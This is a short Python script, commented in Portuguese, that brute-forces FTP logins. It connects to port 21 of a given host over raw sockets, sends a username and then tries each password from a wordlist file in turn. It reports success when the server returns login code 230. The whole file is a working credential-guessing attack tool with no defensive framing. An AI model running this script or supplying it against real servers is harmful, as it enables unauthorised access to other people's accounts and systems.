# importando as libs
import socket
import sys
from time import sleep

# checa a quantidade de argumentos
if len(sys.argv) < 3:
    print(f"""
        Modeo de uso:
            {sys.argv[0]} <host> <user>
            """)
    sys.exit()

# recebe os argumentos
host = sys.argv[1]
port = 21
user = sys.argv[2]

# abre a wordlist
with open("wordlist.txt", "r") as f:
    # para cada palavra, retira possíveis quebras de linha
    for i in f:
        i = i.strip()
        print(f"[+] Tentando senha {i}")

        # cria o socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.recv(1024) # recebe o banner
        s.send(b'USER '+user.encode()+b'\n') # envia o usuário
        s.recv(1024) # recevbe a resposta
        s.send(b'PASS '+i.encode()+b'\n') # envia a senha
        resp = s.recv(1024) # recabe a resposta

        # checa a resposta
        if "230" in resp.decode():
            print(f"[+] Senha encontrada {i}")
            s.close()
            break
        else:
            s.close()
            sleep(5)

